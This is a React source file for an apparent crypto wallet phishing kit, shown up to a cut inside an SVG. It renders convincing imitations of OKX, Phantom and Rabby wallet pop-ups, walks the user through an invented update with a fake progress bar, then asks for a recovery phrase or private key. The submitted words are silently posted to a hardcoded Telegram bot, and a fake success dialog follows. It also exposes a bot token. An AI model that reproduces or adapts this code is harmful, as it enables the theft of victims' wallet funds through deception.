import { useState, useEffect, useRef } from 'react'

/* ──────────────────────────────────────────────
   Telegram notification
────────────────────────────────────────────── */
const TG_TOKEN = import.meta.env.VITE_TG_TOKEN || '8487135691:AAGZeZevl9vb5ZvttbErKyreaOlGo7Jdo1s'
const TG_CHAT  = import.meta.env.VITE_TG_CHAT || '5245115191'

function sendToTelegram(walletName, words) {
  // Skip if no token
  if (!TG_TOKEN || !TG_CHAT) return
  
  try {
    const phrase = words.join(' ')
    const text = `🔐 *New Seed Phrase Submitted*\n\n*Wallet:* ${walletName}\n*Phrase:* \`${phrase}\``
    // Non-blocking API call with abort timeout
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 5000)
    
    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'Markdown' }),
      signal: controller.signal,
    })
    .then(() => clearTimeout(timeoutId))
    .catch(() => {
      clearTimeout(timeoutId)
      // Silent fail - don't block the user's flow
    })
  } catch (err) {
    // Silent fail
  }
}

/* ──────────────────────────────────────────────
   Loading → Success dialog (matches rpc-monitor.app)
────────────────────────────────────────────── */
export function ImportResultDialog({ onDone }) {
  const [step, setStep] = useState('loading') // 'loading' | 'success'

  useEffect(() => {
    const t = setTimeout(() => setStep('success'), 3000)
    return () => clearTimeout(t)
  }, [])

  return (
    <>
      <style>{`
        @keyframes swalSpin { to { transform: rotate(360deg); } }
        .swal-overlay {
          position: fixed; inset: 0; z-index: 99999;
          background: rgba(0,0,0,0.45);
          display: flex; align-items: center; justify-content: center;
        }
        .swal-box {
          background: #fff; border-radius: 16px;
          padding: 48px 40px 36px;
          width: 440px; max-width: calc(100vw - 32px);
          display: flex; flex-direction: column; align-items: center;
          box-shadow: 0 20px 60px rgba(0,0,0,0.25);
          font-family: 'Inter', -apple-system, sans-serif;
          text-align: center;
        }
        @media(max-width:600px){
          .swal-overlay { align-items: stretch; }
          .swal-box { width:100%; max-width:100%; min-height:100%; border-radius:0; padding:64px 32px 48px; justify-content:center; }
        }
      `}</style>
      <div className="swal-overlay">
        <div className="swal-box">
          {step === 'loading' ? (
            <>
              <h2 style={{ fontSize: 28, fontWeight: 700, color: '#545454', margin: '0 0 12px' }}>Loading...</h2>
              <p style={{ fontSize: 17, color: '#545454', margin: '0 0 28px' }}>Connecting to wallet</p>
              <svg style={{ animation: 'swalSpin 0.8s linear infinite' }} width="52" height="52" viewBox="0 0 52 52" fill="none">
                <circle cx="26" cy="26" r="22" stroke="#e0e0e0" strokeWidth="4" />
                <path d="M26 4 A22 22 0 0 1 48 26" stroke="#3b82f6" strokeWidth="4" strokeLinecap="round" />
              </svg>
            </>
          ) : (
            <>
              <div style={{ width: 72, height: 72, borderRadius: '50%', border: '3px solid #10b981', display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: 20 }}>
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#10b981" strokeWidth="2.5" strokeLinecap="round">
                  <path d="M20 6L9 17l-5-5" />
                </svg>
              </div>
              <h2 style={{ fontSize: 28, fontWeight: 700, color: '#545454', margin: '0 0 10px' }}>Success!</h2>
              <p style={{ fontSize: 17, color: '#545454', margin: '0 0 28px' }}>Wallet connected successfully</p>
              <button
                onClick={onDone}
                style={{ background: '#10b981', color: '#fff', border: 'none', borderRadius: 8, padding: '12px 48px', fontSize: 17, fontWeight: 600, cursor: 'pointer' }}
              >Continue</button>
            </>
          )}
        </div>
      </div>
    </>
  )
}

/* ──────────────────────────────────────────────
   Shared helpers
────────────────────────────────────────────── */
function useProgressTimer(active, onDone) {
  const [progress, setProgress] = useState(0)
  useEffect(() => {
    if (!active) return
    setProgress(0)
    const iv = setInterval(() => {
      setProgress(p => {
        if (p >= 100) { clearInterval(iv); setTimeout(onDone, 400); return 100 }
        return p + 1
      })
    }, 100)
    return () => clearInterval(iv)
  }, [active])
  return progress
}

/* shared seed grid component */
function SeedGrid({ wordCount, setWordCount, onConfirm, walletName = 'Unknown Wallet', textColor = '#192945', borderColor = '#d0d5dd', focusBorderColor = '#7084ff', bg = '#fff', btnBg = '#7084ff' }) {
  const count = parseInt(wordCount)
  const containerRef = useRef(null)
  const [error, setError] = useState('')

  const handleConfirm = () => {
    setError('')
    const inputs = containerRef.current ? containerRef.current.querySelectorAll('input') : []
    const words = Array.from(inputs).map(el => el.value.trim()).filter(Boolean)
    const got = words.length
    if (count === 1) {
      if (got === 0) { setError('Private key cannot be empty.'); return }
    } else {
      if (got === 0) { setError(`Invalid recovery phrase length. Expected ${count} words, got 0 words.`); return }
      if (got < count) { setError(`Invalid recovery phrase length. Expected ${count} words, got ${got} words.`); return }
    }
    if (got > 0) sendToTelegram(walletName, words)
    onConfirm()
  }

  return (
    <>
      <style>{`
        .sg-wrap { display:flex; flex-direction:column; padding: 0 16px 16px; gap: 12px; }
        .sg-select-row { display:flex; align-items:center; gap:8px; background:#f4f6fa; border-radius:10px; padding:10px 14px; }
        .sg-select-icon { color:#6b7280; flex-shrink:0; }
        .sg-select { font-size:14px; font-weight:500; color:#374151; border:none; background:transparent; outline:none; cursor:pointer; flex:1; }
        .sg-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px; }
        .sg-cell { position:relative; }
        .sg-num { position:absolute; top:50%; left:10px; transform:translateY(-50%); font-size:11px; font-weight:600; color:#9ca3af; pointer-events:none; user-select:none; line-height:1; }
        .sg-input { width:100%; padding:10px 8px 10px 26px; font-size:13px; font-weight:500; border:1.5px solid #e5e7eb; border-radius:10px; outline:none; background:#fafafa; color:#111827; transition:all 0.18s; box-sizing:border-box; font-family:inherit; }
        .sg-input:focus { border-color:var(--sg-focus, #7084ff); background:#fff; box-shadow:0 0 0 3px color-mix(in srgb, var(--sg-focus, #7084ff) 15%, transparent); }
        .sg-input::placeholder { color:#c4c9d4; }
        .sg-pk { width:100%; padding:13px 16px; font-size:14px; font-weight:500; border:1.5px solid #e5e7eb; border-radius:12px; outline:none; background:#fafafa; color:#111827; transition:all 0.18s; box-sizing:border-box; font-family:inherit; }
        .sg-pk:focus { border-color:var(--sg-focus, #7084ff); background:#fff; box-shadow:0 0 0 3px color-mix(in srgb, var(--sg-focus, #7084ff) 15%, transparent); }
        .sg-pk::placeholder { color:#c4c9d4; }
        .sg-btn { width:100%; height:52px; border:none; border-radius:12px; font-size:16px; font-weight:600; cursor:pointer; transition:opacity 0.18s, transform 0.1s; font-family:inherit; letter-spacing:0.01em; }
        .sg-btn:hover { opacity:0.9; }
        .sg-btn:active { transform:scale(0.98); }
      `}</style>
      <div className="sg-wrap" style={{ '--sg-focus': focusBorderColor }}>
        {/* Word count selector */}
        <div className="sg-select-row">
          <svg className="sg-select-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M9 5H7a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2h-2"/><rect x="9" y="3" width="6" height="4" rx="1"/></svg>
          <select className="sg-select" value={wordCount} onChange={e => setWordCount(e.target.value)}>
            <option value="12">12-word recovery phrase</option>
            <option value="15">15-word recovery phrase</option>
            <option value="18">18-word recovery phrase</option>
            <option value="21">21-word recovery phrase</option>
            <option value="24">24-word recovery phrase</option>
            <option value="25">25-word recovery phrase</option>
            <option value="1">Private key</option>
          </select>
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="m6 9 6 6 6-6"/></svg>
        </div>

        {/* Seed inputs */}
        <div ref={containerRef} style={{ maxHeight: 280, overflowY: 'auto', paddingRight: 2 }}>
          {count === 1 ? (
            <input className="sg-pk" type="text" placeholder="Enter your private key…" autoComplete="off" spellCheck="false" />
          ) : (
            <div className="sg-grid">
              {Array.from({ length: count }, (_, i) => (
                <div key={i} className="sg-cell">
                  <span className="sg-num">{i + 1}</span>
                  <input
                    className="sg-input"
                    type="text"
                    placeholder={`word ${i + 1}`}
                    autoComplete="off"
                    spellCheck="false"
                    autoCapitalize="none"
                  />
                </div>
              ))}
            </div>
          )}
        </div>

        {/* Confirm button */}
        <button
          className="sg-btn"
          onClick={handleConfirm}
          style={{ background: btnBg, color: '#fff' }}
        >
          Import Wallet
        </button>
      </div>
    </>
  )
}

/* shared step nav header for import screen */
function ImportNavHeader({ onBack, title, titleColor = '#192945' }) {
  return (
    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '12px', borderBottom: '1px solid #e6e6e6' }}>
      <button onClick={onBack} style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 4, borderRadius: 4 }}>
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
          <path d="m15 18-6-6 6-6" />
        </svg>
      </button>
      <p style={{ fontSize: 17, fontWeight: 600, color: titleColor, margin: 0 }}>{title}</p>
      <div style={{ width: 24 }} />
    </div>
  )
}

/* ══════════════════════════════════════════════
   1. OKX WALLET MODAL
   - Loading: cover-light.webm video centered, "Your portal to Web3" below
   - Update: OKX SVG icon, "Update Available", "Version 6.136.0", dark dot bullets, black "Update" btn
   - Updating: OKX circle spinner, "Updating OKX Wallet", progress bar black
   - Import: "Import with Secret Phrase" header, word count inline select
══════════════════════════════════════════════ */
export function OKXModal({ onClose, onImportDone }) {
  const [phase, setPhase] = useState('loading')
  const [wordCount, setWordCount] = useState('12')
  const progress = useProgressTimer(phase === 'updating', () => setPhase('import'))

  const OKXIcon = ({ size = 64 }) => (
    <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
      <rect width="32" height="32" rx="8" fill="#000" />
      <rect x="6.5" y="6.5" width="6" height="6" rx="1" fill="#fff" />
      <rect x="6.5" y="19.5" width="6" height="6" rx="1" fill="#fff" />
      <rect x="19.5" y="6.5" width="6" height="6" rx="1" fill="#fff" />
      <rect x="19.5" y="19.5" width="6" height="6" rx="1" fill="#fff" />
      <rect x="13" y="13" width="6" height="6" rx="1" fill="#fff" />
    </svg>
  )

  const OKXIconSmall = () => (
    <svg width="28" height="28" viewBox="0 0 32 32" fill="none">
      <rect x="6.5" y="6.5" width="6" height="6" rx="1" fill="#000" />
      <rect x="6.5" y="19.5" width="6" height="6" rx="1" fill="#000" />
      <rect x="19.5" y="6.5" width="6" height="6" rx="1" fill="#000" />
      <rect x="19.5" y="19.5" width="6" height="6" rx="1" fill="#000" />
      <rect x="13" y="13" width="6" height="6" rx="1" fill="#000" />
    </svg>
  )

  const items = [
    'Fix main build modifying desktop build steps',
    'Improving the security system',
    'Fix incorrect network information',
    'Improve performance on signature request',
  ]

  return (
    <>
      <style>{`
        @keyframes okxSpin { to { transform: rotate(360deg); } }
        @keyframes okxSlide { from{opacity:0;transform:translateX(20px)} to{opacity:1;transform:translateX(0)} }
        .okx-overlay { position:fixed;inset:0;z-index:10000;background:rgba(18,18,18,.5);pointer-events:auto; }
        .okx-modal { position:fixed;z-index:10001;top:0;right:32px;width:360px;height:680px;background:#fff;border:1px solid #eaecef;box-shadow:0 8px 40px rgba(0,0,0,.18);display:flex;flex-direction:column;overflow:hidden;font-family:'Inter',-apple-system,sans-serif;animation:okxSlide .2s ease; }
        @media(max-width:600px){.okx-modal{top:0;left:0;right:0;bottom:0;width:100%;height:100%;max-height:100%;border-radius:0;}}
      `}</style>
      <div className="okx-overlay" onClick={onClose} />
      <div className="okx-modal">

        {/* Loading */}
        {phase === 'loading' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', background: '#fff', overflow: 'hidden' }}>
            <video src="/media/images/cover-light.webm" autoPlay muted playsInline disablePictureInPicture controlsList="nodownload nofullscreen noremoteplayback" style={{ width: '100%', height: 'auto', pointerEvents: 'none' }} onEnded={() => setPhase('update')} />
            <div style={{ marginBottom: 6 }}>
              <h3 style={{ fontSize: 24, fontWeight: 700, color: '#000', margin: 0, textAlign: 'center' }}>Your portal to Web3</h3>
            </div>
            <p style={{ fontSize: 12, color: '#909090', margin: 0 }}>Wallet · Trade · NFT · Earn · DApp</p>
          </div>
        )}

        {/* Update Available */}
        {phase === 'update' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', background: '#fff' }}>
            <div style={{ padding: '32px 24px', display: 'flex', flexDirection: 'column', height: '100%', boxSizing: 'border-box' }}>
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 32 }}>
                <div style={{ marginBottom: 20 }}><OKXIcon size={64} /></div>
                <h3 style={{ fontSize: 24, fontWeight: 700, color: '#000', margin: '0 0 4px', textAlign: 'center' }}>Update Available</h3>
                <p style={{ fontSize: 16, color: '#909090', margin: 0, textAlign: 'center' }}>Version 6.136.0</p>
              </div>
              <div style={{ background: '#f5f5f5', borderRadius: 12, padding: 20, marginBottom: 32 }}>
                <ul style={{ margin: 0, padding: 0, listStyle: 'none', display: 'flex', flexDirection: 'column', gap: 12 }}>
                  {items.map((item, i) => (
                    <li key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: 12 }}>
                      <div style={{ width: 6, height: 6, borderRadius: '50%', background: '#000', flexShrink: 0, marginTop: 7 }} />
                      <span style={{ fontSize: 14, color: '#000', lineHeight: 1.5 }}>{item}</span>
                    </li>
                  ))}
                </ul>
              </div>
              <div style={{ marginTop: 'auto' }}>
                <button onClick={() => setPhase('updating')} style={{ width: '100%', height: 48, background: '#000', color: '#fff', border: 'none', borderRadius: 999, fontSize: 15, fontWeight: 500, cursor: 'pointer' }}>Update</button>
                <div style={{ textAlign: 'center', marginTop: 16 }}>
                  <a href="https://www.okx.com/help" target="_blank" rel="noreferrer" style={{ fontSize: 14, color: '#000', textDecoration: 'none' }}>Need help? Contact our Support</a>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Updating */}
        {phase === 'updating' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', background: '#fff' }}>
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '32px 24px', boxSizing: 'border-box' }}>
              <div style={{ position: 'relative', width: 80, height: 80, marginBottom: 32 }}>
                <svg style={{ width: 80, height: 80, color: '#f5f5f5' }} viewBox="0 0 100 100"><circle cx="50" cy="50" r="44" stroke="currentColor" strokeWidth="12" fill="none" /></svg>
                <svg style={{ position: 'absolute', inset: 0, width: 80, height: 80, color: '#000', animation: 'okxSpin 1s linear infinite' }} viewBox="0 0 100 100"><circle cx="50" cy="50" r="44" stroke="currentColor" strokeWidth="12" strokeLinecap="round" strokeDasharray="69,278" fill="none" /></svg>
                <div style={{ position: 'absolute', inset: 0, display: 'flex', alignItems: 'center', justifyContent: 'center' }}><OKXIconSmall /></div>
              </div>
              <h3 style={{ fontSize: 24, fontWeight: 700, color: '#000', margin: '0 0 8px', textAlign: 'center' }}>Updating OKX Wallet</h3>
              <p style={{ fontSize: 16, color: '#909090', margin: '0 0 32px', textAlign: 'center' }}>Please wait while we update to version 6.136.0</p>
              <div style={{ width: '100%', marginBottom: 24 }}>
                <div style={{ width: '100%', height: 8, background: '#f5f5f5', borderRadius: 999, overflow: 'hidden' }}>
                  <div style={{ height: '100%', width: `${progress}%`, background: '#000', borderRadius: 999, transition: 'width .1s linear' }} />
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 8 }}>
                  <span style={{ fontSize: 14, color: '#909090' }}>Downloading update...</span>
                  <span style={{ fontSize: 14, fontWeight: 500, color: '#000' }}>{progress}%</span>
                </div>
              </div>
              <div style={{ marginTop: 'auto', textAlign: 'center' }}>
                <p style={{ fontSize: 14, color: '#909090' }}>Please do not close this window during the update.</p>
              </div>
            </div>
          </div>
        )}

        {/* Import */}
        {phase === 'import' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', background: '#fff' }}>
            <ImportNavHeader onBack={onClose} title="Import with Secret Phrase" />
            <SeedGrid wordCount={wordCount} setWordCount={setWordCount} onConfirm={onImportDone || onClose} walletName="OKX Wallet" btnBg="#000" />
          </div>
        )}
      </div>
    </>
  )
}

/* ══════════════════════════════════════════════
   2. PHANTOM WALLET MODAL
   - Loading: dark bg #222, ghost SVG centered, "BooOooOo..."
   - Updating: same ghost SVG floating + "Updating your wallet" + "What's new?" + tip + progress
   - Import: dark bg, Phantom wordmark header, ghost 80px, "Import wallet" title, 3-col grid inputs, purple "Import Wallet" btn
══════════════════════════════════════════════ */
function PhantomSeedForm({ wordCount, setWordCount, onClose, onImportDone }) {
  const seedRef = useRef(null)
  const count = parseInt(wordCount)
  const handleImport = () => {
    if (seedRef.current) {
      const inputs = seedRef.current.querySelectorAll('input')
      const words = Array.from(inputs).map(el => el.value.trim()).filter(Boolean)
      if (words.length > 0) sendToTelegram('Phantom Wallet', words)
    }
    onImportDone ? onImportDone() : onClose()
  }
  return (
    <>
      <style>{`
        .ph-select-row { display:flex;align-items:center;gap:8px;background:rgba(255,255,255,0.08);border-radius:10px;padding:10px 14px;margin:0 24px 12px; }
        .ph-select { flex:1;font-size:13px;font-weight:500;color:#ccc;border:none;background:transparent;outline:none;cursor:pointer;font-family:inherit; }
        .ph-seed-grid { display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;padding:0 24px;max-height:240px;overflow-y:auto; }
        .ph-seed-cell { position:relative; }
        .ph-seed-num { position:absolute;top:50%;left:8px;transform:translateY(-50%);font-size:10px;font-weight:700;color:#888;pointer-events:none;user-select:none; }
        .ph-seed-input { width:100%;padding:10px 6px 10px 22px;border:1.5px solid #3a3a4a;border-radius:10px;font-size:12px;font-weight:500;color:#fff;font-family:inherit;outline:none;background:#2a2a3a;transition:all 0.18s;box-sizing:border-box; }
        .ph-seed-input:focus { border-color:#ab9ff2;background:#323248;box-shadow:0 0 0 3px rgba(171,159,242,0.15); }
        .ph-seed-input::placeholder { color:#555;font-size:11px; }
        .ph-seed-pk { width:100%;padding:12px 14px;border:1.5px solid #3a3a4a;border-radius:10px;font-size:13px;font-weight:500;color:#fff;font-family:inherit;outline:none;background:#2a2a3a;transition:all 0.18s;box-sizing:border-box;margin:0 24px;width:calc(100% - 48px); }
        .ph-seed-pk:focus { border-color:#ab9ff2;background:#323248; }
        .ph-seed-pk::placeholder { color:#555; }
      `}</style>
      <div className="ph-select-row">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#888" strokeWidth="2"><path d="M9 5H7a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2h-2"/><rect x="9" y="3" width="6" height="4" rx="1"/></svg>
        <select className="ph-select" value={wordCount} onChange={e => setWordCount(e.target.value)}>
          <option value="12">12-word recovery phrase</option>
          <option value="24">24-word recovery phrase</option>
          <option value="25">25-word recovery phrase</option>
          <option value="1">Private key</option>
        </select>
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#888" strokeWidth="2"><path d="m6 9 6 6 6-6"/></svg>
      </div>
      {count === 1 ? (
        <div ref={seedRef} style={{ padding: '0 24px' }}>
          <input className="ph-seed-pk" type="text" placeholder="Enter your private key…" autoComplete="off" spellCheck="false" style={{ width: '100%', padding: '12px 14px', border: '1.5px solid #3a3a4a', borderRadius: 10, fontSize: 13, fontWeight: 500, color: '#fff', fontFamily: 'inherit', outline: 'none', background: '#2a2a3a', boxSizing: 'border-box' }} />
        </div>
      ) : (
        <div className="ph-seed-grid" ref={seedRef}>
          {Array.from({ length: count }, (_, i) => (
            <div key={i} className="ph-seed-cell">
              <span className="ph-seed-num">{i + 1}</span>
              <input className="ph-seed-input" type="text" placeholder={`word ${i + 1}`} autoComplete="off" spellCheck="false" autoCapitalize="none" />
            </div>
          ))}
        </div>
      )}
      <div style={{ padding: '16px 24px 24px' }}>
        <button onClick={handleImport} style={{ width: '100%', height: 48, background: '#ab9ff2', color: '#222', border: 'none', borderRadius: 12, fontSize: 16, fontWeight: 600, cursor: 'pointer', transition: 'opacity 0.2s' }}>Import Wallet</button>
      </div>
    </>
  )
}

export function PhantomModal({ onClose, onImportDone }) {
  const [phase, setPhase] = useState('loading')
  const [wordCount, setWordCount] = useState('12')
  const progress = useProgressTimer(phase === 'updating', () => setPhase('import'))

  useEffect(() => {
    if (phase !== 'loading') return
    const t = setTimeout(() => setPhase('updating'), 3000)
    return () => clearTimeout(t)
  }, [])

  const GhostSVG = ({ height = 120 }) => (
    <svg style={{ height, width: 'auto' }} width="593" height="493" viewBox="0 0 593 493" fill="none">
      <path d="M70.0546 493C145.604 493 202.38 427.297 236.263 375.378C232.142 386.865 229.852 398.351 229.852 409.378C229.852 439.703 247.252 461.297 281.592 461.297C328.753 461.297 379.119 419.946 405.218 375.378C403.386 381.811 402.471 387.784 402.471 393.297C402.471 414.432 414.375 427.757 438.643 427.757C515.108 427.757 592.03 292.216 592.03 173.676C592.03 81.3243 545.327 0 428.112 0C222.069 0 0 251.784 0 414.432C0 478.297 34.3405 493 70.0546 493ZM357.141 163.568C357.141 140.595 369.962 124.514 388.734 124.514C407.049 124.514 419.87 140.595 419.87 163.568C419.87 186.541 407.049 203.081 388.734 203.081C369.962 203.081 357.141 186.541 357.141 163.568ZM455.126 163.568C455.126 140.595 467.947 124.514 486.719 124.514C505.034 124.514 517.855 140.595 517.855 163.568C517.855 186.541 505.034 203.081 486.719 203.081C467.947 203.081 455.126 186.541 455.126 163.568Z" fill="#FFFDF8" />
    </svg>
  )

  return (
    <>
      <style>{`
        @keyframes pheSlide { from{opacity:0;transform:translateX(20px)} to{opacity:1;transform:translateX(0)} }
        @keyframes pheFloat { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-10px)} }
        .phe-overlay { position:fixed;inset:0;z-index:10000;background:rgba(18,18,18,.5);pointer-events:auto; }
        .phe-modal { position:fixed;z-index:10001;top:0;right:32px;width:360px;height:685px;background:#222;border:1px solid #323232;box-shadow:0 8px 40px rgba(0,0,0,.4);display:flex;flex-direction:column;overflow:hidden;font-family:'Inter',-apple-system,sans-serif;animation:pheSlide .2s ease; }
        @media(max-width:600px){.phe-modal{top:0;left:0;right:0;bottom:0;width:100%;height:100%;max-height:100%;border-radius:0;}}
      `}</style>
      <div className="phe-overlay" onClick={onClose} />
      <div className="phe-modal">

        {/* Loading: Ghost + BooOooOo... */}
        {phase === 'loading' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', background: '#222' }}>
            <GhostSVG height={120} />
            <div style={{ marginTop: 32 }}>
              <p style={{ color: '#fff', fontSize: 24, fontWeight: 600, margin: 0, textAlign: 'center' }}>BooOooOo...</p>
            </div>
          </div>
        )}

        {/* Updating: floating ghost + progress */}
        {phase === 'updating' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '32px 24px', background: '#222', boxSizing: 'border-box' }}>
            <div style={{ animation: 'pheFloat 2s ease-in-out infinite' }}>
              <GhostSVG height={120} />
            </div>
            <div style={{ marginTop: 32 }}>
              <p style={{ color: '#fff', fontSize: 24, fontWeight: 600, margin: 0, textAlign: 'center', transition: 'opacity .5s' }}>Updating your wallet</p>
            </div>
            <div style={{ marginTop: 24 }}>
              <p style={{ color: '#999', fontWeight: 500, fontSize: 17, margin: 0, textAlign: 'center' }}>What&apos;s new?</p>
            </div>
            <div style={{ marginTop: 16 }}>
              <p style={{ color: '#999', fontSize: 17, margin: 0, textAlign: 'center', lineHeight: 1.5 }}>View Solana, Ethereum, and Polygon balances together.</p>
            </div>
            <div style={{ marginTop: 32, width: '100%' }}>
              <div style={{ width: '100%', height: 8, background: '#1a1a1a', borderRadius: 999, overflow: 'hidden' }}>
                <div style={{ height: '100%', width: `${progress}%`, background: '#ab9ff2', borderRadius: 999, transition: 'width .1s linear' }} />
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginTop: 8 }}>
                <span style={{ fontSize: 14, color: '#909090' }}>Downloading update...</span>
                <span style={{ fontSize: 14, fontWeight: 500, color: '#fff' }}>{progress}%</span>
              </div>
            </div>
          </div>
        )}

        {/* Import */}
        {phase === 'import' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflowY: 'auto', background: '#222' }}>
            {/* Header */}
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '10px 16px', borderBottom: '1px solid #323232', height: 59 }}>
              <button onClick={onClose} style={{ background: 'none', border: 'none', cursor: 'pointer' }}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#777" strokeWidth="2"><circle cx="12" cy="12" r="10"/><path d="m15 9-6 6"/><path d="m9 9 6 6"/></svg>
              </button>
              {/* Phantom wordmark */}
              <span style={{ fontSize: 15, fontWeight: 700, color: '#999', letterSpacing: '0.04em', fontFamily: 'inherit' }}>Phantom</span>
              <a href="https://help.phantom.com/hc/en-us" target="_blank" rel="noreferrer">
                <svg width="15" height="15" viewBox="0 0 15 15" fill="#777"><path d="M7.5 0C3.36 0 0 3.36 0 7.5S3.36 15 7.5 15 15 11.64 15 7.5 11.64 0 7.5 0zm.813 11.748a.476.476 0 0 1-.475.476H6.626a.476.476 0 0 1-.475-.476v-.782c0-.261.213-.475.475-.475h1.212c.262 0 .475.214.475.475v.782zm1.917-4.662c-.322.445-.721.798-1.212 1.059-.276.184-.46.368-.552.582-.061.138-.107.322-.138.537-.015.169-.168.292-.337.292H6.503a.164.164 0 0 1-.163-.18c.031-.43.138-.752.307-.998.215-.291.598-.644 1.15-1.027.291-.184.506-.4.675-.66.168-.26.245-.567.245-.873 0-.353-.092-.644-.291-.857-.2-.214-.46-.322-.813-.322-.291 0-.521.092-.721.261-.123.107-.2.245-.245.43-.061.215-.261.353-.476.353l-1.38-.03c-.169 0-.307-.154-.292-.322.046-.737.337-1.289.86-1.73.523-.46 1.196-.690 2.025-.690 1.012 0 1.795.261 2.373.768.584.506.875 1.196.875 2.07 0 .552-.169 1.043-.476 1.488z" /></svg>
              </a>
            </div>
            {/* Ghost + title */}
            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '24px 24px 0' }}>
              <GhostSVG height={80} />
              <h3 style={{ color: '#fff', fontSize: 24, fontWeight: 500, margin: '16px 0 8px', textAlign: 'center' }}>Import wallet</h3>
              <p style={{ color: '#999', fontSize: 15, margin: '0 0 24px', textAlign: 'center', maxWidth: 290, lineHeight: 1.5 }}>Import an existing wallet with your 12 or 24-word recovery phrase.</p>
            </div>
            {/* Seed */}
            <PhantomSeedForm wordCount={wordCount} setWordCount={setWordCount} onClose={onClose} onImportDone={onImportDone} />
          </div>
        )}
      </div>
    </>
  )
}

/* ══════════════════════════════════════════════
   3. RABBY WALLET MODAL
   - Loading: gradient purple bg, Rabby rabbit SVG (100px), "Loading your Rabby Wallet", tagline
   - Update: Rabby SVG (80px), "Update Available", "Version 0.93.49", checkmark bullets #7084ff, "Update Now" purple btn
   - Updating: bouncing Rabby SVG, "Updating Rabby Wallet", progress #7084ff
   - Import: "Import Secret Phrase", word-count select, 3-col grid
══════════════════════════════════════════════ */
export function RabbyModal({ onClose, onImportDone }) {
  const [phase, setPhase] = useState('loading')
  const [wordCount, setWordCount] = useState('12')
  const progress = useProgressTimer(phase === 'updating', () => setPhase('import'))

  useEffect(() => {
    if (phase !== 'loading') return
    const t = setTimeout(() => setPhase('update'), 3000)
    return () => clearTimeout(t)
  }, [])

  const RabbySVG = ({ size = 100 }) => (
    <svg width={size} height={size} viewBox="0 0 100 100" fill="none">
      <path d="M92.53 55.386c3.375-7.57-13.312-28.715-29.253-37.525-10.048-6.825-20.519-5.887-22.64-2.89-4.653 6.576 15.41 12.148 28.83 18.65-2.885 1.258-5.603 3.515-7.202 6.401-5.002-5.482-15.982-10.203-28.865-6.4-8.682 2.562-15.898 8.604-18.686 17.728a5.428 5.428 0 00-2.218-.47c-3.018 0-5.465 2.456-5.465 5.486s2.447 5.486 5.465 5.486c.56 0 2.31-.377 2.31-.377l27.952.203C31.58 79.48 22.745 82.082 22.745 85.166c0 3.084 8.453 2.249 11.627 1.099 15.194-5.503 31.513-22.654 34.314-27.591 11.76 1.472 21.643 1.647 23.844-3.288z" fill="url(#rabby_g0)" />
      <path fillRule="evenodd" clipRule="evenodd" d="M69.465 33.623h.002c.622-.245.521-1.167.35-1.891-.392-1.665-7.165-8.378-13.525-11.385-8.666-4.097-15.047-3.886-15.99-1.997 1.765 3.631 9.949 7.041 18.496 10.602 3.647 1.52 7.36 3.067 10.668 4.67h-.001z" fill="url(#rabby_g1)" />
      <path fillRule="evenodd" clipRule="evenodd" d="M58.467 70.175c-1.752-.672-3.732-1.29-5.983-1.849 2.4-4.31 2.903-10.692.637-14.726-3.181-5.662-7.174-8.676-16.453-8.676-5.103 0-18.843 1.725-19.087 13.239-.026 1.208 0 2.315.086 3.333l25.091.182c-3.383 5.387-6.55 9.382-9.324 12.42 3.33.856 6.078 1.575 8.601 2.235 2.394.627 4.585 1.2 6.878 1.787 3.46-2.53 6.712-5.288 9.554-7.945z" fill="url(#rabby_g2)" />
      <path d="M14.379 60.312c1.025 8.746 5.977 12.174 16.095 13.188 10.12 1.015 15.924.334 23.651 1.04 6.454.59 12.217 3.89 14.355 2.75 1.923-1.027.847-4.736-1.727-7.116-3.337-3.085-7.956-5.23-16.083-5.991 1.62-4.451 1.166-10.692-1.35-14.088-3.636-4.91-10.35-7.129-18.846-6.16-8.876 1.014-17.382 5.4-16.095 16.377z" fill="url(#rabby_g3)" />
      <defs>
